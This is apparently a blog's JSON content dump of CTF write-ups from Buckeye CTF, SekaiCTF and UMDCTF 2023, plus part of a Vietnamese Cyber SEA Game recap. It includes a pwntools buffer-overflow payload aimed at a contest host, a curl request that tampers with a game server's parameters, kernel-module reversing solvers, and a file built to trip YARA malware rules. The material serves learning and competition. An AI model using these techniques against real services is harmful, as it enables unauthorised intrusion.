tiên, team đã bứt tốc từ vị trí cuối bảng lên vị trí 6, bị dẫn trước bởi các team Singapore, Malaysia, Thái, Brunei và Myanmar\nSau hơn một giờ diễn ra cuộc thi, đội Singapore đã gây ấn tượng khi hoàn thành tất cả các thử thách, kèm theo việc lắc chuông mỗi khi \u0026ldquo;clear\u0026rdquo; một chủ đề nào đó. Lúc này, tâm lý của đội chúng tôi có chút \u0026ldquo;sốc\u0026rdquo;, nhưng đã nhanh chóng ổn định tinh thần và tiếp tục vượt qua mọi thách thức.\nBứt tốc lần 2: Khoảng 1 giờ 45 phút đến 2 giờ sau khi cuộc thi bắt đầu, đội của chúng tôi liên tục giải quyết các thử thách về Crypto, Hacking Challenge 1 và Forensic. Việc này giúp đội chúng tôi vượt qua đội Thái Lan, đồng thời chiếm top 3 trên Bảng xếp hạng, chỉ đứng sau đội Singapore và Malaysia.\nPhase 3: End game Bứt tốc lần 3: Sau một thời gian dài bế tắc ở các thách thức Forensic và Hacking Challenge 2 bởi độ guessing của chúng, bằng thiên phú \u0026ldquo;bruteforce\u0026rdquo; của các thành viên, đội của chúng tôi cuối cùng cũng vượt qua khó khăn, giải quyết một lượt toàn bộ các thử thách Forensic (tới lúc này Thái Sơn gần như đã thuộc toàn bộ source của 7 thử thách Forensic vì luẩn quẩn ở đây quá lâu 🤣)\nChốt hạ Cyber SEA Game 2023 với Việt Nam là thử thách cuối của Hacking Challenge 2 bằng cú submit của Hoàng Huy. Điều này giúp chúng tôi vượt qua đội Malaysia, trở thành đội thứ hai giải toàn bộ các thử thách, sau gần 4 tiếng đồng hồ.\nP/s: Sau đó khoảng 1 tiếng thì đội thứ 3 là Team Thailand cũng hoàn thành toàn bộ thử thách và BTC đã có thể định ra 3 đội trao Nhất, Nhì, Ba của toàn giải Cyber SEA Game.\nBảng xếp hạng Trao Giải Tuy có chút tiếc nuối về việc không đạt được chiếc cúp vô địch của Cyber SEA Game nhưng Nu_RobinHust cũng rút ra được bài học rất lớn về việc chuẩn bị kỹ càng mọi thứ trước khi tham gia 1 cuộc thi cũng như sự bình tĩnh khi gặp các khó khăn đột ngột.\nĐây sẽ là bước tiến rất lớn cho team cũng như Đại học Bách khoa Hà Nội, chúng mình cũng sẽ lấy đó làm kinh nghiệm và động lực để phát triển bản thân mình trong tương lai.\n","date":"2023-11-10T00:00:00Z","image":"/p/cyber-sea-game-2023-recap/featured_hu59a906ccfb75fefec7be147e7f623c55_262995_120x120_fill_box_smart1_3.png","permalink":"/p/cyber-sea-game-2023-recap/","title":"Cyber SEA Game 2023 | Recap"},{"content":"Here is writeups for some challs that i solved in this competition!\nCurrency Converter | REV attachment: converter.jar\nNeed to convert USD to another currency? Well I hope its either Euros, Canadian, or Yen!\nReceive attachment include 1 jar file, so use Decompiler - Jar String Editor decompile jar to java\nIn the CurrencyConverter.java we get the flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class CurrencyConverter { public static String convert_euro(double var0) { double var2 = var0 * 0.92D; return \u0026#34;Euro: \u0026#34; + var2; } public static String convert_canada(double var0) { double var2 = var0 * 1.36D; return \u0026#34;Canadian: \u0026#34; + var2; } public static String convert_yen(double var0) { double var2 = var0 * 145.14D; return \u0026#34;Japanese Yen: \u0026#34; + var2; } private static String flag() { return \u0026#34;bctf{o0ps_y0u_fOuNd_mE}\u0026#34;; } } 8ball | REV Attachment: dist.zip\nLet me guide you to the flag.\nWhen extract file, i receive an elf file (8ball)\nthen load it into IDA, and follow the main part\nand function print_flag() (but we can skip it bcuz it seem difficult)\nIn main, we have: if ( argc != 2 ), !strcmp(*argv, \u0026quot;./magic8ball\u0026quot;) and if ( v8 \u0026amp;\u0026amp; strstr(argv[1], \u0026quot;flag\u0026quot;) ) so i think i must rename the file (8ball to magic8ball) and argument is flag\nBeginner Menu | PWN attachment: beginner-menu.c\nI just made this menu for my coding class. I think I covered all the switch cases.\nnetcat: nc chall.pwnoh.io 13371\nIn this chall, we can see the game with guess number (each netcat connection)\nbut if we guess the correct number, the netcat will disconnect :((\n1 2 3 4 5 6 7 8 9 10 11 12 13 else if(atoi(buf) ==3){ while(num!=atoi(guess)){ printf(\u0026#34;Guess the number I\u0026#39;m thinking of: \u0026#34;); fgets(guess, 50, stdin); if(atoi(guess)\u0026lt;num){ printf(\u0026#34;Guess higher!\\n\u0026#34;); } else if(atoi(guess)\u0026gt;num){ printf(\u0026#34;Guess lower!\\n\u0026#34;); } } exit(0); // exit when guess the correct number } print_flag() will be called if pass all if-else\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 if(strcmp(buf, \u0026#34;0\\n\u0026#34;)==0){ printf(\u0026#34;That\u0026#39;s not an option\\n\u0026#34;); exit(0); } if(atoi(buf) ==1){ printf(joke[(rand()%5)]); exit(0); } else if(atoi(buf) == 2){ printf(weather[(rand()%5)]); exit(0); } else if(atoi(buf) ==3){ while(num!=atoi(guess)){ printf(\u0026#34;Guess the number I\u0026#39;m thinking of: \u0026#34;); fgets(guess, 50, stdin); if(atoi(guess)\u0026lt;num){ printf(\u0026#34;Guess higher!\\n\u0026#34;); } else if(atoi(guess)\u0026gt;num){ printf(\u0026#34;Guess lower!\\n\u0026#34;); } } exit(0); } else if(atoi(buf)==4){ exit(0); } else if(atoi(buf)\u0026gt;4){ printf(\u0026#34;That\u0026#39;s not an option\\n\u0026#34;); exit(0); } print_flag(); but i found vuln :\u0026gt;\nso we can press Enter into the select option of netcat to get flag\nStarter Buffer | PWN attachment: start-buffer.c\nTell me your favorite number and I might give you the flag ;).\nnetcat: nc chall.pwnoh.io 13372\nI see the buffer overflow vulnerability here\nso we can use pwntool to send byte 0x45454545 through netcat and string buffer and get the flag (The current value of the flag is 0xaabbccdd, so we must input 60 * \u0026quot;A\u0026quot; + byte 0x45454545 so that the value after input of the flag becomes 0x45454545)\n1 2 3 4 5 6 7 8 from pwn import * p = remote(\u0026#34;chall.pwnoh.io\u0026#34;, 13372) exploit_payload = b\u0026#34;A\u0026#34; * 60 + p32(0x45454545) p.sendline(exploit_payload) response = p.recvall() print(response) Needle in the Wifi Stack | MISC attachment: frames.pcap\nThis chall has a .pcap file, as usual, i\u0026rsquo;ll strings + grep first and it has many base64 strings\nso i think we can find with the format of flag: btcf{ encode to base64: YmN0Zn\nConvert YmN0Znt0dzBfcG8xbnRfNF9nMzNfYzBuZzNzN2kwbn0K0 to base64\nParkour | MISC (ftpotato) Completely unrelated to CTF Minecraft parkour.\nserver: chall.pwnoh.io:13389\nThis challenge is a minecraft parkour server created by the author in version 1.20.1\nAfter many unsuccessful attempts to jump on the blocks, i decided to cheat :333 and i use Wurst Client\nAfter cheating with the Wurst Client, you can fly to the flag in the sky and get it\nMy First Hash | CRYPTO Here\u0026rsquo;s your flag: 8f163b472e2164f66a5cd751098783f9 Psyc! Its encrypted. You think I\u0026rsquo;d give it to you that easily? Definitely don\u0026rsquo;t look at my code tho -\u0026gt;\u0026lt;- (when you find the flag, put it in bctf{} format)\nattachment: my-first-hash.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import hashlib from sys import exit flag = \u0026#39;8f163b472e2164f66a5cd751098783f9\u0026#39; str = input(\u0026#34;Enter the flag\\n\u0026#34;) str = hashlib.md5(str.encode()) if str.digest().hex() == flag: print(\u0026#34;Congrats! You got the flag!\u0026#34;) else: print(\u0026#34;Nope. Try again!\u0026#34;) exit() it seems like an easy md5 reverse, use MD5 Center to reverse this MD5 hash, we get orchestra \u0026ndash;\u0026gt; bctf{orchestra}\nRivest-Shamir-Adleman | CRYPTO Big numbers make big security\nattachment: dist.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 message = b\u0026#34;[REDACTED]\u0026#34; m = int.from_bytes(message, \u0026#34;big\u0026#34;) p = 3782335750369249076873452958462875461053 q = 9038904185905897571450655864282572131579 e = 65537 n = p * q et = (p - 1) * (q - 1) d = pow(e, -1, et) c = pow(m, e, n) print(f\u0026#34;e = {e}\u0026#34;) print(f\u0026#34;n = {n}\u0026#34;) print(f\u0026#34;c = {c}\u0026#34;) # OUTPUT: # e = 65537 # n = 34188170446514129546929337540073894418598952490293570690399076531159358605892687 # c = 414434392594516328988574008345806048885100152020577370739169085961419826266692 this is an easy RSA (basic), we have both p, q, n, c, e so we can write script to solve:\n1 2 3 4 5 6 7 8 9 10 11 p = 3782335750369249076873452958462875461053 q = 9038904185905897571450655864282572131579 e = 65537 c = 414434392594516328988574008345806048885100152020577370739169085961419826266692 n = p * q phi = (p - 1) * (q - 1) d = pow(e, -1, phi) m = pow(c, d, n) print(m.to_bytes((m.bit_length() + 7) // 8, \u0026#34;big\u0026#34;)) Secret Code | CRYPTO Here\u0026rsquo;s your flag again: 1:10:d0:10:42:41:34:20:b5:40:03:30:91:c5:e1:e3:d2:a2:72:d1:61:d0:10:e3:a0:43:c1:01:10:b1:b1:b0:b1:40:9 LOL you snub_wrestle. Good luck trying to undo my xor key I used on each character of the flag.\nI think this is easy chall about xor\nFirst, we must remove : from the encryp, it gives us: 110d01042413420b540033091c5e1e3d2a272d161d010e3a043c10110b1b1b0b1409, then convert from hex to byte \u0026amp; xor with snub_wrestle to get flag\n","date":"2023-10-02T00:00:00Z","image":"/p/buckeye-ctf-2023-writeups/featured-image_hu5fad3dab004c0aa4880db40f68baffb0_36302_120x120_fill_box_smart1_3.png","permalink":"/p/buckeye-ctf-2023-writeups/","title":"Buckeye CTF 2023 | Writeups"},{"content":"Unfortunately, during the tournament, I was tricked into debugging the Teyvat Travel Guide challenge, which led me to go the wrong way and give up while making myself feel like I had no hope (when it was really only at medium level):\u0026lt; and lost. Quite a bit of effort for the Guardians of the Kernel challenge\nAzusawa’s Gacha World Author: enscribe\n❖ Note The website only contains the challenge description, and is not needed to solve the challenge.\nChallenge structure analysis In the first challenge, I received a full folder of Sekai\u0026rsquo;s Gacha game (Created by Unity)\nWhile searching through folders, I found a file named Assembly-CSharp.dll\nKnowing it was related to Csharp, I loaded it into DnSpy to get started. Luckily, this file is not too complicated, the information is clear.\n1. Character\n2. GachaRequest\n3. GachaResponse\nReading these 3 classes, I concluded that when I gacha, I will send the parameters in GachaRequest including crystals, pulls and numPulls to the server and receive GachaResponse containing the class character and which includes flag\nWhere does the server receive requests? 4. CreateGachaWebRequest\n1 2 3 4 5 6 7 8 9 10 11 12 13 // GachaManager // Token: 0x06000016 RID: 22 RVA: 0x0000259C File Offset: 0x0000079C private UnityWebRequest CreateGachaWebRequest(string json) { byte[] bytes = Encoding.UTF8.GetBytes(json); string s = \u0026#34;aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh\u0026#34;; UnityWebRequest unityWebRequest = new UnityWebRequest(Encoding.UTF8.GetString(Convert.FromBase64String(s)), \u0026#34;POST\u0026#34;); unityWebRequest.uploadHandler = new UploadHandlerRaw(bytes); unityWebRequest.downloadHandler = new DownloadHandlerBuffer(); unityWebRequest.SetRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;); unityWebRequest.SetRequestHeader(\u0026#34;User-Agent\u0026#34;, \u0026#34;SekaiCTF\u0026#34;); return unityWebRequest; } aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh là mã hoá base64 của http://172.86.64.89:3000/gacha\nYah, so I have found a server + some payload setup, here I can solve it with burpsuite or send it via shell :\u0026raquo;, I choose via shell for convenience\nP/s: There is also an option for game-style challs like this: Cheat Engine is quite simple, it can determine the exact address of the objects and modify them (in this writeup I will not mention it because it is not pure REV)\nGacha time So, based on what I analyze, I can write a shell curl to retrieve data like I\u0026rsquo;m gacha with the example parameters being 1000, 1, 1. (ie I have 1000 diamonds, new spin 1 time and spin 1 more time)\n1 curl -s -X POST http://172.86.64.89:3000/gacha -d \u0026#39;{\u0026#34;crystals\u0026#34;:1,\u0026#34;pulls\u0026#34;:1,\u0026#34;numPulls\u0026#34;:1}\u0026#39; -H \u0026#39;Content-type: application/json\u0026#39; -H \u0026#39;User-Agent: SekaiCTF\u0026#39; | jq . Maybe I still need to open the game to check what the parameters are\nYah, here it is, the chance of winning gacha is 0% and can only be received when spinning 1 million times :)). So it\u0026rsquo;s simple, because the number of spins per request is only between 1 and 10, so setup pulls will be 999999 and numPulls will be 1, and crystals will be set to 1000.\nPut the jumbled part into cyberchef with base64 and convert it to an image\nflag: SEKAI{D0N7_73LL_53G4_1_C0P13D_7H31R_G4M3}\nGuardians of the Kernel Author: Iyed\n❖ Note It’s just a warmup but with another layer which is the kernel.\nChallenge analysis In this chall, I received an attachment consisting of 2 quite strange files\nAfter researching, I understand that bzImage is a kernel image file that loads and initializes the kernel while booting the system and the .cpio file is like a file system restorer (because it manages data structures and file lists)\nSo I can completely build the kernel image (here I can use qemu), but this build chall is a bit redundant (I don\u0026rsquo;t need debug).\nWe an easily run this kernel with the command:\n1 qemu-system-x86_64 -kernel bzImage -initrd initramfs.cpio -nographic -monitor none -no-reboot -append \u0026#34;console=ttyS0\u0026#34; Instead, I decompress the files in initramfs.cpio with the command: cpio -idv -F inittramfs.cpio\nNotice that there is a file flag_checker.ko (this file contains information about loading modules into the kernel), so maybe I won\u0026rsquo;t need to debug through the kernel anymore, I\u0026rsquo;ll just load it into IDA\nGreat, there is device_ioctl that handles I/O Control, so I exploited this part and bonus\nThe main stream\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 __int64 __fastcall device_ioctl(__int64 a1, int a2, __int64 a3) { __int64 result; // rax unsigned __int8 *v6; // rax int v7; // edx int v8; // eax unsigned int v9; // eax __int64 v10; // rdx if ( a2 == 28673 ) { if ( !layers[1] ) return 0LL; if ( !copy_from_user(buffer, a3, 7LL) ) { buffer[7] = 0; v6 = buffer; while ( (unsigned __int8)(*v6 - 48) \u0026lt;= 9u ) { if ( \u0026amp;buffer[7] == ++v6 ) { v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * *(_DWORD *)buffer, 15), 11); v8 = __ROR4__(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15); v9 = 1984242169 * ((v7 + 1204333666) ^ (1507359807 * v8) ^ 7 ^ (((v7 + 1204333666) ^ (unsigned int)(1507359807 * v8)) \u0026gt;\u0026gt; 16)); if ( (((-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026gt;\u0026gt; 16) ^ (-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9))) != 261736481 ) return 0LL; return device_ioctl_cold(); } } return 0LL; } return -14LL; } if ( a2 == 28674 ) { if ( !layers[2] ) return 0LL; v10 = copy_from_user(buffer, a3, 12LL); if ( !v10 ) { do { buffer[v10] += buffer[v10 + 1] * ~(_BYTE)v10; ++v10; } while ( v10 != 12 ); if ( *(_QWORD *)buffer != 0x788C88B91D88AF0ELL || *(_DWORD *)\u0026amp;buffer[8] != 2113081836 || buffer[12] ) return 0LL; printk(\u0026amp;unk_2EB, a3); return 1LL; } return -14LL; } if ( a2 != 28672 ) { printk(\u0026amp;unk_302, a3); return 0LL; } if ( copy_from_user(buffer, a3, 6LL) ) return -14LL; if ( *(_DWORD *)buffer != 1095451987 || *(_WORD *)\u0026amp;buffer[4] != 31561 ) return 0LL; printk(\u0026amp;unk_2B6, a3); result = 1LL; layers[1] = 1; return result; } As in the text view, we can see that the format of the flag is SEKAI{, then that is the end of the stream \u0026lt;\u0026ndash; Change the value from dec to char for clearer display\n1 if ( *(_DWORD *)buffer != \u0026#39;AKES\u0026#39; || *(_WORD *)\u0026amp;buffer[4] != \u0026#39;{I\u0026#39; ) Processing layer 1 Maybe this is the part that takes up all my time during the tournament :)))), being lazy should be punished by God :(\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 if ( !copy_from_user(buffer, a3, 7LL) ) { buffer[7] = 0; v6 = buffer; while ( (unsigned __int8)(*v6 - 48) \u0026lt;= 9u ) { if ( \u0026amp;buffer[7] == ++v6 ) { v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * *(_DWORD *)buffer, 15), 11); v8 = __ROR4__(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15); v9 = 1984242169 * ((v7 + 1204333666) ^ (1507359807 * v8) ^ 7 ^ (((v7 + 1204333666) ^ (unsigned int)(1507359807 * v8)) \u0026gt;\u0026gt; 16)); if ( (((-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026gt;\u0026gt; 16) ^ (-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9))) != 261736481 ) return 0LL; return device_ioctl_cold(); } } return 0LL; } After writing a lot of failed solutions using rev, I switched to bruteforce.\nIt can be seen that layer 1 contains 7 chars, the algorithm is a bit complicated (and still confused between signed and unsigned type), so I will bruteforce this quickly (actually, while thinking about how to write bruteforce, I can finish the third rev challenge 🐧)\nscript bruteforce:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def __ROL4__(val, bits, bit_size=32): return (val \u0026lt;\u0026lt; bits % bit_size) \u0026amp; (2 ** bit_size - 1) | ((val \u0026amp; (2 ** bit_size - 1)) \u0026gt;\u0026gt; (bit_size - (bits % bit_size))) def __ROR4__(val, bits, bit_size=32): return ((val \u0026amp; (2 ** bit_size - 1)) \u0026gt;\u0026gt; bits % bit_size) | (val \u0026lt;\u0026lt; (bit_size - (bits % bit_size)) \u0026amp; (2 ** bit_size - 1)) for i in range(10000000): f = str(i).rjust(7, \u0026#39;0\u0026#39;).encode() tmp = (f[3] \u0026lt;\u0026lt; 24) | (f[2] \u0026lt;\u0026lt; 16) | (f[1] \u0026lt;\u0026lt; 8) | f[0] v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * tmp, 15), 11) v8 = __ROR4__(422871738 * ((f[5] \u0026lt;\u0026lt; 8) ^ (f[6] \u0026lt;\u0026lt; 16) ^ f[4]), 15) v9 = 1984242169 * (((v7 + 0x47C8AC62) \u0026amp; 0xFFFFFFFF) ^ ((1507359807 * v8) \u0026amp; 0xFFFFFFFF) ^ 7 ^ ((((v7 + 0x47C8AC62) \u0026amp; 0xFFFFFFFF) ^ ((1507359807 * v8) \u0026amp; 0xFFFFFFFF)) \u0026gt;\u0026gt; 16)) v9 \u0026amp;= 0xFFFFFFFF if ((((2477530742 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026amp; 0xFFFFFFFF) \u0026gt;\u0026gt; 16) ^ ((2477530742 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026amp; 0xFFFFFFFF)) == 261736481: print(f) \u0026ndash;\u0026gt; 6001337\nThe solution other with z3 makes me bitter\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from z3 import * buffer = [BitVec(f\u0026#39;x{i}\u0026#39;, 8) for i in range(7)] _buffer = buffer[:] buffer = [ZeroExt(24, x) for x in buffer] v8 = 7 * RotateLeft(1507359807 * RotateRight(422871738 * Concat(*_buffer[:4][::-1]), 15), 11) v9 = RotateRight(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15) v10 = 1984242169 * ((v8 + 1204333666) ^ (1507359807 * v9) ^ 7 ^ LShR((v8 + 1204333666) ^ (1507359807 * v9), 16)) s = Solver() s.add([And(x \u0026gt;= 0x30, x \u0026lt;= 0x39) for x in _buffer]) shr13 = (LShR(v10, 13) ^ v10) s.add((LShR((-1817436554 * shr13), 16) ^ (-1817436554 * shr13)) == 261736481) print(bytes([s.model()[x].as_long() for x in _buffer])) Check layer 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 v10 = copy_from_user(buffer, a3, 12LL); if ( !v10 ) { do { buffer[v10] += buffer[v10 + 1] * ~(_BYTE)v10; ++v10; } while ( v10 != 12 ); if ( *(_QWORD *)buffer != 0x788C88B91D88AF0ELL || *(_DWORD *)\u0026amp;buffer[8] != 2113081836 || buffer[12] ) return 0LL; printk(\u0026amp;unk_2EB, a3); return 1LL; } Layer 2, although it has 12 char, is easier to solve. Here, we will have 1 more hint to make solving easier, that the last character will be \u0026ldquo;}\u0026rdquo; :\u0026gt;\nThere are also other conditions:\nbuffer[i] += buffer[i + 1] * ~(_BYTE)v10; (i from 0 to 12) buffer[12] = 0 so buffer[11] = \u0026lsquo;}\u0026rsquo; Based on this, I can build the code through z3:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 def solve_buffer(): s = Solver() buffer = [BitVec(i, 8) for i in range(13)] buffer_ = [BitVec(i, 8) for i in range(13)] for i in range(12): buffer_[i] = buffer[i] + buffer[i + 1] * ~BitVecVal(i, 8) for i in range(12): s.add(And(buffer[i] \u0026gt;= 0x20, buffer[i] \u0026lt;= 0x7e)) s.add(Concat(buffer_[7], buffer_[6], buffer_[5], buffer_[4], buffer_[3], buffer_[2], buffer_[1], buffer_[0]) == 0x788C88B91D88AF0E) s.add(Concat(buffer_[11], buffer_[10], buffer_[9], buffer_[8]) == 2113081836) if s.check() == sat: x = s.model() result = [] for i in range(13): result.append(int(str(x[buffer[i]]))) return result else: return None def main(): result = solve_buffer() print(\u0026#39;\u0026#39;.join(chr(val) for val in result)) if __name__ == \u0026#34;__main__\u0026#34;: main() \u0026ndash;\u0026gt; SEKAIPL@YER}\nflag: SEKAI{6001337SEKAIPL@YER}\nSekaiCTF 2023 - REV Reviews The reverse challenges of SekaiCTF are diverse, new + extremely difficult If I let myself play only one topic, I\u0026rsquo;ll probably cry, so I should play a few more to keep rank :\u0026lt; The most unfortunate thing about this tournament is probably not re3 but the lack of pwn1 (wasting too much time doing pwn2), that\u0026rsquo;s all, stopping at top xx/981 is good, next year I will take revenge: \u0026gt; ","date":"2023-08-27T00:00:00Z","image":"/p/sekaictf-2023-reverse-engineering/featured-image_hu53ff5d738f6f6b8e65c2845372b95fb7_671573_120x120_fill_box_smart1_3.png","permalink":"/p/sekaictf-2023-reverse-engineering/","title":"SekaiCTF 2023 | Reverse Engineering"},{"content":"Information UMDCTF 2023 starts at 5:00 AM on April 29, 2023, and ends at 5:00 AM on May 1, 2023 (which is not at all suitable for someone like me who loves to sleep in). The challenges in this competition revolve around Pokemon.\nRanking Our team ranked 17th/745 teams with 12,799 points. Detail of scoreboard here\nIt\u0026rsquo;s a bit disappointing that during the competition, I couldn\u0026rsquo;t fully solve the Forensics challenges. By around 5 AM, when the competition ended, I was too exhausted to continue thinking.\nIn this writeup, I will provide solutions for the challenges in ascending order based on their increasing point values.\nMalware Chall Disclaimer This challenge provided hint to the Doctor Hate Him challenge, and I\u0026rsquo;ll discuss that later. Here, they have given the flag.\nUMDCTF{i_understand_that_malware_chall_is_sus}\nMirror Unknown Here we have received a picture (.png file).\nUsing Google Images, we found a cipher alphabet chart.\nThen we put the words obtained into the format of the flag: UMDCTF{} and add the note: Ancient civilizations didn\u0026rsquo;t believe in whitespace or lowercase\nUMDCTF{SINJOHRUINS}\nNo. 352 Here, there is a mention of password 1 and password 2, which made me think of the steghide tool (pay attention to password 1, which is the name of Pokemon number 352 - written in lowercase).\npassword 1: kecleon\n1 2 3 4 ┌──(kali㉿Spid3r)-[~/Downloads] └─$ steghide extract -sf hide-n-seek.jpg Enter passphrase: wrote extracted data to \u0026#34;kecleon.jpg\u0026#34;. and password 2: timetofindwhatkecleonishiding (In the description of the challenge\u0026hellip;)\n1 2 3 4 ┌──(kali㉿Spid3r)-[~/Downloads] └─$ steghide extract -sf kecleon.jpg Enter passphrase: wrote extracted data to \u0026#34;flag.txt\u0026#34;. UMDCTF{KECLE0NNNNN}\nFire Type Pokemon Only In this challenge, we receive a pcapng file. Use Wireshark to read the data.\nI have checked both strings and filtered the captured data, but I haven\u0026rsquo;t found anything other than the files retrieved from FTP.\nBased on the header of the secret file, we can determine that it is a zip file (the remaining files also have the correct format).\nAnd this zip file requires us to enter a password\u0026hellip; to extract a file named wisdom.mp4.\nUpon searching for \u0026lsquo;pass\u0026rsquo; in that pcapng file, we found the actual password for this file..\nYARA Trainer Gym This is quite an interesting challenge that I had the opportunity to explore :))). The challenge provides us with a website to test: https://yara-trainer-gym.chall.lol\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import \u0026#34;elf\u0026#34; import \u0026#34;math\u0026#34; rule rule1 { condition: uint32(0) == 0x464c457f } rule rule2 { strings: $rocket1 = \u0026#34;jessie\u0026#34; $rocket2 = \u0026#34;james\u0026#34; $rocket3 = \u0026#34;meowth\u0026#34; condition: all of ($rocket*) } rule rule3 { meta: description = \u0026#34;Number of sections in a binary\u0026#34; condition: elf.number_of_sections == 40 } rule rule4 { strings: $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65} $hex2 = {5445414d524f434b4554} $hex3 = {696d20736f207469726564} $hex4 = {736c656570792074696d65} condition: ($hex1 and $hex2) or ($hex3 and $hex4) } rule rule5 { condition: math.entropy(0, filesize) \u0026gt;= 6 } rule rule6 { strings: $xor = \u0026#34;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#34; xor condition: $xor } rule rule7 { condition: for any section in elf.sections : (section.name == \u0026#34;poophaha\u0026#34;) } rule rule8 { condition: filesize \u0026lt; 2MB and filesize \u0026gt; 1MB } Basically, here we have to create a file and upload it to the website (satisfying all 8 rules) in order to obtain the flag.\nI approached it by dividing the file into two separate smaller files (each file satisfying a specific set of rules) to avoid complexity during creation.\nThe first file will satisfy rules 1-4 and 6-7. The second file will satisfy rules 5 and 8 (since generating entropy and file size simultaneously with creating the attributes mentioned above can be a bit challenging).\nFirst file first rule:\nuint32(0) == 0x464c457f\nThis checks whether the first 32 bits (offset 0) have the value 0x464c457f (indicating whether the file is in the ELF format or not)\nTo achieve this, it\u0026rsquo;s quite simple. Just add the value 7f 45 4c 46 corresponding to ELF to the file header.\nsecond rule:\n1 2 3 4 5 6 7 strings: $rocket1 = \u0026#34;jessie\u0026#34; $rocket2 = \u0026#34;james\u0026#34; $rocket3 = \u0026#34;meowth\u0026#34; condition: all of ($rocket*) Rule 2 requires the file to contain the strings: jessie, james, and meowth.\n\u0026ndash;\u0026gt; Convert them to hexadecimal and insert them into the file: 6a 65 73 73 69 65 6a 61 6d 65 73 6d 65 6f 77 74 68\nthird rule:\n1 2 3 4 meta: description = \u0026#34;Number of sections in a binary\u0026#34; condition: elf.number_of_sections == 40 This rule checks if the number of sections in the file is exactly 40. I decided to create a file from C to have multiple initial sections.\n1 2 3 4 5 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# echo \u0026#34;int main(){return 0;}\u0026#34; \u0026gt; main.c ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# gcc -o main main.c Check the number of sections in the newly created main file using the command:\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# objdump -h main Then add the sections to the main file using the command (each time adding one section, continuously repeating until the main file has 40 sections).\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# objcopy --add-section .mysection=data.txt main fourth rule\n1 2 3 4 5 6 7 8 strings: $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65} $hex2 = {5445414d524f434b4554} $hex3 = {696d20736f207469726564} $hex4 = {736c656570792074696d65} condition: ($hex1 and $hex2) or ($hex3 and $hex4) We can choose either hex1 and hex2 or hex3 and hex4 as pairs to insert into the file.\nsixth rule\n1 2 3 4 strings: $xor = \u0026#34;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#34; xor condition: $xor Add the string aqvkpjmdofazwf{lqjm1310\u0026lt; to complete the process: 61 71 76 6b 70 6a 6d 64 6f 66 61 7a 77 66 7b 6c 71 6a 6d 31 33 31 30 3c.\nseventh rule\n1 2 condition: for any section in elf.sections : (section.name == \u0026#34;poophaha\u0026#34;) We need a section named poophaha (Please note that with the 40 sections created earlier, one of them should be named poophaha)\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# objcopy --add-section .poophaha=data.txt main Second file For the remaining part, since rules 5 and 8 go together, I will create a new file and then merge the two files together.\n1 2 3 4 5 6 7 8 9 rule rule5 { condition: math.entropy(0, filesize) \u0026gt;= 6 } rule rule8 { condition: filesize \u0026lt; 2MB and filesize \u0026gt; 1MB } Rule 5 requires the entropy of the file to be greater than or equal to 6, while Rule 8 specifies that the file size must be greater than 1MB and less than 2MB.\nAfter creating the first file, its entropy is quite low (less than 1 dot), so I need to create a new file with a higher entropy to compensate.\nTo achieve an entropy of greater than or equal to 6 (which is quite challenging with files generated from my processes as they often contain repeated bytes), I will create a new file\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# openssl rand -out random.bin 2000000 2000000 here represents the size of the file after creation. I chose this number to comply with Rule 8, and the entropy of the file random.bin generated is very high :)\nNext, I will combine these two files together. To make it easier with a large number of bytes, I will use CyberChef.\nhex of file và file after creation\nUMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}\nAlso, in this challenge it is possible to increase entropy using a zip file. The algorithm it uses is suitable for pushing up the entropy level, which corresponds to a higher degree of randomness between bytes. 